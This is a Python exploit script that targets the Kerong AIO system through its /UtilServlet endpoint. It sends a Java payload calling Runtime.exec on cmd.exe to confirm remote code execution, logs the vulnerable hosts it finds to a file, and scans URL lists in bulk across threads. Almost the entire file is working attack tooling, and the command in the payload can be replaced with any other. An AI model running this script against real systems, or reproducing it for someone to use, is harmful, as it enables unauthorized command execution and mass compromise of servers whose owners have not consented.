import argparse
import requests
import concurrent.futures
import sys

def poc(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = """operation=calculate&value=BufferedReader+br+%3d+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec("cmd.exe+/c+echo+xhs").getInputStream()))%3bString+line%3bStringBuilder+b+%3d+new+StringBuilder()%3bwhile+((line+%3d+br.readLine())+!%3d+null)+{b.append(line)%3b}return+new+String(b)%3b&fieldName=example_field"""
    vulnurl = url + "/UtilServlet"
    try:
        # 发送 POST 请求
        r = requests.post(vulnurl, headers=headers, data=data, verify=False, timeout=5)
        if r.status_code == 200 and 'xhs' in r.text:
            print('\033[1;31m' + '[+] Success ' + url + '\033[0m')
            with open('results.txt', 'a') as f:
                f.write(url + '\n')
        else:
            print('[-] Failed')
    except requests.exceptions.ConnectionError as e:
        print(f"连接失败:{e}")
# 批量
def pl(filename):
    with open(filename, 'r',encoding='utf-8') as f:
        urls = [line.strip() for line in f.readlines()]
    return urls

def help():
    helpinfo = """  _____  _  __           _____ ____  
 |  __ \| |/ /     /\   |_   _/ __ \ 
 | |__) | ' /     /  \    | || |  | |
 |  _  /|  <     / /\ \   | || |  | |
 | | \ \| . \ _ / ____ \ _| || |__| |
 |_|  \_\_|\_(_)_/    \_\_____\____/ 
"""
    print(helpinfo)
    print("科荣AIO.RCE".center(100, '*'))
    print(f"[+]{sys.argv[0]} -u --url http://www.xxx.com 即可进行单个漏洞检测")
    print(f"[+]{sys.argv[0]} -f --file targetUrl.txt 即可对选中文档中的网址进行批量检测")
    print(f"[+]{sys.argv[0]} -h --help 查看更多详细帮助信息")
    print("--@ztomato".rjust(100," "))

def main():
    parser = argparse.ArgumentParser(description='科荣AIO.RCE漏洞单批检测脚本@ztomato')
    parser.add_argument('-u','--url', type=str, help='单个漏洞网址')
    parser.add_argument('-f','--file', type=str, help='批量检测文本')
    parser.add_argument('-t','--thread',type=int, help='线程，默认为5')
    args = parser.parse_args()
    thread = 5
    if args.thread:
        thread = args.thread
    if args.url:
        poc(args.url)
    elif args.file:
        urls = pl(args.file)
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
            executor.map(poc, urls)
    else:
        help()
if __name__ == '__main__':
    main()